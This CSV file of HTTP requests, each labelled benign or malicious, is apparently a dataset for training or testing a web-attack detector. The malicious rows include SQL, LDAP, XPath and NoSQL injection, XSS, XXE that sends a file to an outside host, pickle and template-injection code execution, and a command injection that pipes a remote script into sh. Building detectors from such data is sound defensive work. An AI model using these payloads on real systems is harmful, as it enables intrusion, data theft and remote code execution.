label,text
malicious,"POST /regex/validate/input HTTP/1.1
Host: inputvalidator.dev-solutions.cloud
User-Agent: Python-urllib/3.9
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Sec-CH-UA: ""Python-urllib"";v=""3.9"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Linux""
Content-Length: 187

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
benign,"POST /session/start HTTP/1.1
Host: cloud-workforce-platform.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Cookie: wf_sid=MTI3NDIzNzU5NjA3MjI3NzAwMzc1; csrfmiddlewaretoken=4kw7e2xq9f7wbjpl
Referer: https://cloud-workforce-platform.org/session/login
Origin: https://cloud-workforce-platform.org
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
User-Agent: curl/7.88.1

email=jennifer.smith%40careerhub.com&password=OpenRoads!77"
benign,"GET /shop/collections/summertime-favorites?sort=popularity HTTP/1.1
Host: urban-style-outfitters.co.uk
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Referer: https://urban-style-outfitters.co.uk/"
benign,"POST /orders/submit HTTP/1.1
Host: express-food-delivery.us
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Length: 132
Connection: keep-alive
Origin: https://express-food-delivery.us
Referer: https://express-food-delivery.us/menu
Cookie: session=xd7sb3v7f4c1b2a9e3e6d7b8c0a1f2d3e

order_id=45893&user_id=6524&delivery=contactless&instructions=Q2FuIHlvdSBwbGVhc2UgaGVsZCBdLXJpbmVzIHRvIHRoZSBkb29yIGFuZCBlYXZlcyBwbGVhc2U/IEl0J3MgYSBjdXN0b21lciBsaWtlLg=="
benign,"OPTIONS /api/v1/resources/items HTTP/1.1
Host: service-inventory.cloud
Origin: https://portal.finance-analytics.io
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Authorization
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Connection: keep-alive"
benign,"POST /analytics/beacon HTTP/1.1
Host: smart-home-hub-iot.net
Content-Type: text/plain
Origin: https://smart-home-hub-iot.net
User-Agent: curl/7.88.1
Content-Length: 21
Connection: close

status=active&device=thermostat"
malicious,"POST /api/v3/users/filter HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/json
Accept: */*
Content-Length: 94

{""searchFilter"": ""(department=finance)(objectClass=groupOfNames))(|(uid=administrator)""}"
benign,"GET /news/2024/04/11/electric-vehicles-adoption-trends HTTP/1.1
Host: forward-drive-insights.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Referer: https://forward-drive-insights.io/
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
malicious,"PUT /v1/users/modify-profile HTTP/1.1
Host: api.cloud-data-services.io
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiNzY1NGMyLWE4OTItNDQxMS1iOTY5LTM0YmU4ZjQ5OGVhNSIsImV4cCI6MTY4MjkxMTk0Mn0.W7vCTGph9IHS8Qs7yuOU0a7J5EfxbZ0jp20dHxzF_Pw
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Cache-Control: no-cache
Origin: https://portal.cloud-data-services.io

{
  ""user_details"": {
    ""first_name"": ""attacker"",
    ""profile"": {
      ""bio"": ""Experienced developer"",
      ""social_links"": {
        ""twitter"": ""@h4x0r"",
        ""linkedin"": ""attacker-profile""
      }
    }
  },
  ""account_info"": {
    ""subscription_level"": ""gold"",
    ""override_settings"": {
      ""credits_override"": 99999,
      ""is_feature_xyz_enabled"": true
    }
  }
}"
malicious,"POST /shopping/cart/add-item HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
Content-Length: 68
Origin: https://online-retail-store.biz

item_id=12345&options=red');db.products.updateOne({item:'12345'},{$inc:{stock:-1}});//"
benign,"GET /news/2024/04/27/latest-tech-updates HTTP/1.1
Host: future-insights.net
Connection: keep-alive
Accept: application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
benign,"POST /user/account/password-reset HTTP/1.1
Host: green-energy-supply.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/113.0.1774.35
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Origin: https://green-energy-supply.org
Referer: https://green-energy-supply.org/user/account/password-reset

email=marcus.jenkins%40green-energy-mail.org"
benign,"POST /user/signup HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Referer: https://api.cloud-data-services.ai/user/signup
Origin: https://api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ey
Connection: keep-alive

username=anita_ghosh&email=anita.ghosh%40cloudservice.ai&password=GreenLeaf89&password_confirm=GreenLeaf89&terms_accepted=true"
malicious,"POST /account/profile/edit HTTP/1.1
Host: securepay.cloud-services-platform.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: https://securepay.cloud-services-platform.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept-Language: en-US,en;q=0.7
Cookie: sec_token=2afc9d0b1e783f6c42

user=martin&user_bio=<!--#INCLUDE ViRtUaL =""/dev/shm/secret.env"" -->"
benign,"POST /api/v1/events HTTP/1.1
Host: eventstreaming-hub.io
Authorization: Bearer f32ljds0okda9js8djs82lka0aaPQL39
Content-Type: application/json
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 105

{""title"":""Tech Meetup San Francisco"",""location"":""SF Innovation Center"",""startDate"":""2024-08-24T18:00:00Z"",""capacity"":120,""organizer"":""tech.community@hub.io""}"
malicious,"POST /v1/products/search HTTP/1.1
Host: analytics.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/xml
Content-Type: application/xml
Content-Length: 151
Referer: https://analytics.cloud-data-services.ai/dashboard

<searchRequest>
  <term>' or count(//node()) > 0 or ''='</term>
  <category>metrics</category>
</searchRequest>"
benign,"GET /news/2024/04/green-energy-initiatives HTTP/1.1
Host: ecoinnovate-world.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html;q=0.9,text/plain;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive"
benign,"POST /api/auth/request_reset HTTP/1.1
Host: api.solarwave-tech.io
Content-Type: application/json
Accept: application/json
Origin: https://dashboard.solarwave-tech.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 57
Connection: close

{""email"":""marco.venditti@solarwave-tech.io""}"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: my-personal-blog-site.info
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Referer: https://my-personal-blog-site.info/editor
Origin: https://my-personal-blog-site.info
Access-Control-Request-Method: PATCH
Access-Control-Request-Headers: Content-Type"
benign,"POST /accounts/logout HTTP/1.1
Host: healthforyou-service.net
Referer: https://healthforyou-service.net/account/profile
Cookie: sessionid=fc4384a211b4d9c7
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.94 Safari/537.36
Content-Length: 0
Connection: close"
benign,"GET /inventory/lookup?id=222 HTTP/1.1
Host: advanced-tech-innovations.us
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US
Cookie: user_pref=darkmode=true; auth_token=eyJpdiI6IkRheWxzN0tkYTVJT3dvT1RZT3NCZVE9PSJ9
Connection: keep-alive"
benign,"GET /resources/styles/vendor/fontawesome.min.css HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept: text/css,*/*;q=0.1
Referer: https://online-retail-store.biz/products/electronics/headphones
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /xml/query HTTP/1.1
Host: secure-media-cloud.social
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate
Accept-Charset: utf-8, iso-8859-1;q=0.5
Content-Type: application/xml
Content-Length: 130
Cache-Control: no-cache

<searchRequest>
  <term>' or count(//*) > 0 or ''='</term>
  <category>all</category>
</searchRequest>"
benign,"POST /user-photostream/upload HTTP/1.1
Host: daily-shot-gallery.info
Connection: keep-alive
Content-Length: 425
Content-Type: multipart/form-data; boundary=----UserStreamBoundary
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36
Origin: https://daily-shot-gallery.info
Referer: https://daily-shot-gallery.info/stream

------UserStreamBoundary
Content-Disposition: form-data; name=""photo1""; filename=""cityscape_spring.jpeg""
Content-Type: image/jpeg

<binary jpeg data>
------UserStreamBoundary
Content-Disposition: form-data; name=""photo2""; filename=""street-art.png""
Content-Type: image/png

<binary png data>
------UserStreamBoundary--"
benign,"GET /events/conferences/webdev-summit-2024 HTTP/1.1
Host: devconnect-community.org
User-Agent: Twitterbot/1.0
Accept: text/html,application/xhtml+xml
Cache-Control: no-cache
Connection: close"
benign,"GET /user/profiles?filter[type]=admin&filter[active]=true HTTP/1.1
Host: analytics-data-stream.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Cache-Control: no-cache
Connection: keep-alive
X-Forwarded-For: 203.0.113.195"
benign,"GET /media/articles/2023/health-benefits-of-meditation.mp4 HTTP/1.1
Host: wellness-streaming-service.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: video/mp4,video/webm,video/*;q=0.9,*/*;q=0.8
Range: bytes=0-1023
Referer: https://wellness-streaming-service.ai/articles/health-meditation
Connection: keep-alive"
benign,"POST /upload/avatar HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDfj1EwyNKaPmzhL
Content-Language: en-US
Accept: image/webp,image/apng,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Length: 346
Connection: keep-alive

------WebKitFormBoundaryoDfj1EwyNKaPmzhL
Content-Disposition: form-data; name=""avatar""; filename=""profile_pic.jpg""
Content-Type: image/jpeg

(binary JPEG data)
------WebKitFormBoundaryoDfj1EwyNKaPmzhL--"
malicious,"GET /profile/settings/<img SrC=x oNeRrOr=alert(1)>/privacy HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /comments/view?post=81&comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: forum.techhive-network.net
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Referer: https://forum.techhive-network.net/topics/81
Connection: keep-alive"
benign,"POST /orders/submit HTTP/1.1
Host: shop-ecommerce-online.biz
Content-Type: multipart/form-data; boundary=----FormBoundarycA9Z6tXAo9jhAzBl
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Accept-Language: en-US
DNT: 1
Connection: keep-alive
Content-Length: 303
Cookie: cart_id=fd70c56198eb2b5a7eef

------FormBoundarycA9Z6tXAo9jhAzBl
Content-Disposition: form-data; name=""customer_name""

Emily Rodriguez
------FormBoundarycA9Z6tXAo9jhAzBl
Content-Disposition: form-data; name=""address""

742 Evergreen Terrace, Springfield
------FormBoundarycA9Z6tXAo9jhAzBl
Content-Disposition: form-data; name=""payment_method""

credit_card
------FormBoundarycA9Z6tXAo9jhAzBl
Content-Disposition: form-data; name=""order_notes""

Please deliver between 9am-12pm.
------FormBoundarycA9Z6tXAo9jhAzBl--"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: community.game-dev-forum.org
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Referer: https://community.game-dev-forum.org/profile/settings
Connection: keep-alive"
benign,"GET /images/logo.svg HTTP/1.1
Host: api.interactive-maps.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: image/svg+xml
Accept-Language: en-GB,en;q=0.7
DNT: 1
Referer: https://api.interactive-maps.ai/dashboard
Connection: keep-alive"
benign,"GET /graphics/icons/social-share.svg HTTP/1.1
Host: community-game-dev-forum.org
Accept: image/svg+xml
Referer: https://community-game-dev-forum.org/threads/game-mechanics-discussion
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Connection: close"
benign,"PUT /data/backups/daily/backup_2024-06-20.bak HTTP/1.1
Host: backup-archive-vault.ai
User-Agent: curl/7.85.0
Content-Type: application/octet-stream
Content-Length: 128
Accept: */*
X-Forwarded-For: 203.0.113.47
Connection: close

U29mdHdhcmUgYmFja3VwIGZpbGUgYmluYXJ5IGRhdGEgZGF0YSB0byBiZSBzdG9yZWQgaW4gY3B1Lg=="
benign,"POST /account/new HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
DNT: 1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Connection: close
Content-Length: 162

{""email"":""lisa.martinez@secure-user-portal.net"",""password"":""PassForLisa93"",""firstName"":""Lisa"",""lastName"":""Martinez"",""agreeTerms"":true}"
benign,"GET /downloads/report?file=report-final.pdf HTTP/1.1
Host: green-energy-projects.org
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: application/pdf
Cache-Control: no-cache
If-None-Match: ""a1b2c3d4e5f6""
Connection: keep-alive"
malicious,"PUT /api/preferences/set_advanced HTTP/1.1
Host: controlstation-alpha.io
Content-Type: application/json
Content-Length: 266
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Origin: https://controlstation-alpha.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""font_size"": ""medium"", ""timezone"": ""GMT+1""}}}}"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 148
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36

setting_id=55&update_b64=cHJvZHVjdF9pZD0xMjM7IFVQREFURSB1c2VycyBTRVQgYWRtaW49MSBXSEVSRSBpZD0xOyAtLQ=="
malicious,"GET /search?q=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: community.game-dev-forum.org
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://community.game-dev-forum.org/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
malicious,"POST /services/input/regex-check HTTP/1.1
Host: live-testapi.services-validator.biz
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: application/json
Content-Type: application/json
Content-Length: 184
Origin: https://portal.services-validator.biz

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
benign,"POST /token HTTP/1.1
Host: login.education-platforms.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Authorization: Basic YWRtaW5lZHVjYXRpb246c2VjdXJlMTIzNDU2
User-Agent: python-requests/2.28.1
Accept: application/json
Cache-Control: no-cache
Connection: keep-alive

grant_type=authorization_code&code=ea9f22bc9f4b16a3&redirect_uri=https%3A%2F%2Flogin.education-platforms.net%2Fauth%2Fcallback&client_id=adminducation&client_secret=secure123456"
benign,"GET /robots.txt HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept: text/plain, */*
Accept-Language: en-US
Connection: keep-alive"
benign,"GET /user/profile?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTY4MjA4NTYwMCwiaWF0IjoxNjgyMDgxMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://secure-user-portal.net/login"
benign,"POST /mobile-app/data-sync HTTP/1.1
Host: analytics-sync-service.co
Content-Type: application/xml
Content-Length: 166
User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; SM-A107F Build/QP1A.190711.020)
Accept-Encoding: gzip
Connection: close

<data-sync><deviceId>041ece1e-9a48-4a44-b02f-fb7f951c8f5d</deviceId><sync><lastSync>2024-06-05T13:48:00Z</lastSync><itemsSynced>45</itemsSynced></sync></data-sync>"
malicious,"POST /service/xml/receive HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Content-Type: application/xml
Content-Length: 306
Connection: close

<!DOCTYPE msg [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % dtd SYSTEM ""http://api-malware-data.net/send.dtd"">
%dtd;
%send;
]>
<message><payload>&exfil;</payload></message>"
benign,"GET /forum/thread/54987/view HTTP/1.1
Host: chatsphere-community.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Referer: https://chatsphere-community.net/forum/topic/235
Cookie: session_id=5f8a3bc1e2d3674b9a3d8c5172e1f4a2; logged_in=true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.90 Safari/537.36"
benign,"POST /v2/analytics/config HTTP/1.1
Host: insights-dashboard.dataops.net
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2V9.6F2WZk-A7VwGsLrXpOaCA9GdcHuN1XY_kvR9UBbHt3Q
Content-Type: application/json
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Connection: keep-alive
Content-Length: 347

{
  ""dashboardId"": ""dash-5839"",
  ""widgets"": [
    {
      ""type"": ""line_chart"",
      ""metrics"": [""visits"", ""conversions""],
      ""options"": {
        ""timeRange"": ""last_30_days"",
        ""groupBy"": ""day""
      }
    },
    {
      ""type"": ""pie_chart"",
      ""metrics"": [""traffic_sources""],
      ""options"": {
        ""colors"": [""#44aaff"", ""#ffaa44"", ""#44ffaa""]
      }
    }
  ],
  ""refreshInterval"": 300
}"
malicious,"GET /api/session/validate HTTP/1.1
Host: internal.service-gateway.io
User-Agent: Python-requests/2.25.1
Accept: application/json
X-Pickle-Header: \x80\x03cposix
system
q\x00X\x07\x00\x00\x00uname -a\x85q\x01Rq\x02."
malicious,"POST /api/v1/user/email/change HTTP/1.1
Host: secure-customer-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Referer: https://trusted-affiliate-portal.com/account/overview
Content-Length: 39
Connection: keep-alive
Cookie: session_token=63d9e8b4f251a9d3278160a8c7eab24d

new_email=user.changeme%40examplemail.dev&confirm=yes"
benign,"GET /features/2024/mountains-for-beginners HTTP/1.1
Host: outdoors-explorer.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.7,image/avif,image/webp,*/*;q=0.5
Referer: https://outdoors-explorer.org/features
Accept-Language: en-US,en;q=0.6
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
benign,"GET /news/technology/smart-devices-review HTTP/1.1
Host: the-tech-leaflet.ai
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://the-tech-leaflet.ai/news
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Connection: keep-alive"
benign,"GET /assets/css/main.min.css HTTP/1.1
Host: assets-secure-cloud.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
If-None-Match: ""a7bd12e34f""
Connection: keep-alive"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: image/png,image/*;q=0.8,*/*;q=0.5
X-Requested-With: XMLHttpRequest
Referer: https://dashboard.cloud-data-services.ai/app/home
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
benign,"GET /robots.txt HTTP/1.1
Host: global-content-archive.ai
User-Agent: SiteAuditBot/2.1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /api/maintain/schedule HTTP/1.1
Host: secure-mgmt-api.cloud-services.ai
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Content-Length: 136

{""operation"":""restart_services"",""target_host"":""service-node-10.internal || curl http://dangerous-payload.remote-ops.org/script.sh | sh"",""priority"":""normal""}"
benign,"GET /catalog/item/detail?id=324 HTTP/1.1
Host: fashion-outlet-global.org
Accept: text/html,application/xhtml+xml
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
benign,"POST /api/v1/preferences/save HTTP/1.1
Host: app.smart-home-controls.io
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Content-Length: 76
Connection: keep-alive

{""user_id"":""user_9982"",""preferences"":{""temperature_unit"":""Celsius"",""notifications_enabled"":true}}"
malicious,"GET /blog/article/view HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.76.1
Referer: http://community.game-dev-forum.org/topics/intro{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls%20-la').read() }} #}
Accept: */*
Connection: close"
